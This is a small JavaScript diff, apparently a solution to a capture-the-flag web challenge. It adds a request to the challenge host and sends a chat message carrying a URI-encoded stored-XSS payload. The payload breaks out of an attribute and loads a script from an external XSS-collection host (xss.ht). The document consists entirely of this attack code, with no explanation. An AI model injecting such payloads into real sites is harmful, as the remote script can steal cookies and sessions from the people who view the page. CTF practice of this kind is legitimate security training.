@@ -7,6 +7,13 @@
 csrf_header = new Headers();
 csrf_header.append('CSRF-Protection', '1');
 
+function httpGet()
+{
+    var xmlHttp = new XMLHttpRequest();
+    xmlHttp.open( "GET", 'https://joe.web.ctfcompetition.com', false ); // false for synchronous request
+    xmlHttp.send( null );
+}
+  
 function sendMessage(msg) {
   
   var u = 'https://joe.web.ctfcompetition.com/message?msg=' + encodeURIComponent(msg);
@@ -24,6 +31,8 @@ function sendMessage(msg) {
    });
 
 }
+  
+httpGet();  
 sendMessage("let me rename you");
 var a= decodeURI('%22%3E%3Cscript%20src=https://hrj.xss.ht%3E%3C/script%3E');
 sendMessage(a);
